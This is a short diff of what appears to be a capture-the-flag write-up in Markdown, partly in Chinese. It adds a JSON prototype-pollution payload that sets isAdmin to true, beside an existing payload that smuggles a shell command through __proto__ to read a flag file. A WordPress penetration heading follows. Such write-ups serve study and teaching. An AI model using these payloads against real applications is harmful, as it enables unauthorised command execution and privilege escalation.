@@ -36,7 +36,9 @@ function waf(input_code) {
 {"msg":{"__proto__":{"cmd_rce":"ls;xxd`cat /flag`/flag"},"%ff":""}}
 ```
 
-
+```
+{"__proto__":{"isAdmin":true}}
+```
 ### EzPenetration
 wordpress的渗透
 
